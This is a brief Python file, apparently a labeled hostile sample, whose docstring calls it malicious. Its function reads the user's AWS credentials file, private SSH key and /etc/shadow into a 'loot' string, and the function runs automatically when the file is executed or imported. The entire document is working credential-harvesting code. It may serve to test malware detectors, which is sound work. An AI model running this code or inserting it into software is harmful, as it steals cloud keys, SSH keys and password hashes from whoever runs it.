"""Malicious: Reads sensitive user SSH keys and AWS credentials."""
import os

def read_credentials():
    targets = [
        os.path.expanduser("~/.aws/credentials"),
        os.path.expanduser("~/.ssh/id_rsa"),
        "/etc/shadow"
    ]
    loot = ""
    for path in targets:
        try:
            with open(path, "r") as f:
                loot += f.read()
        except Exception:
            pass
    return loot

read_credentials()
